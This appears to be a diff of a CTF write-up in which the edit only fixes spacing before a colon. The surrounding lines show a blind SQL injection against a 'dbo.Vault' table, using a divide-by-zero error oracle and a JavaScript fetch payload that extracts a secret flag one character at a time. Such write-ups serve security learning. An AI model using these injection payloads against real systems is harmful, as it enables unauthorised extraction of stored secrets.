@@ -132,7 +132,7 @@ Unfortunately, the CTF ended at this time and didn’t manage to finish the chal
 select 1 from dbo.Vault where username='secret' and secret_name='flag' and 1/(ascii(substring(secret_value,1,1))-GUESS)=1
 ```
 
-Finally what needs to be done is just looping through the characters of secret_value and sending for each one this payload :
+Finally what needs to be done is just looping through the characters of secret_value and sending for each one this payload:
 
 ```js
 fetch('/api/stats?username=${encodeURIComponent(' union select 1 from dbo.Vault where username='secret' and secret_name='flag' and 1/(ascii(substring(secret_value,${pos},1))-GUESS)=1;-- -')});`
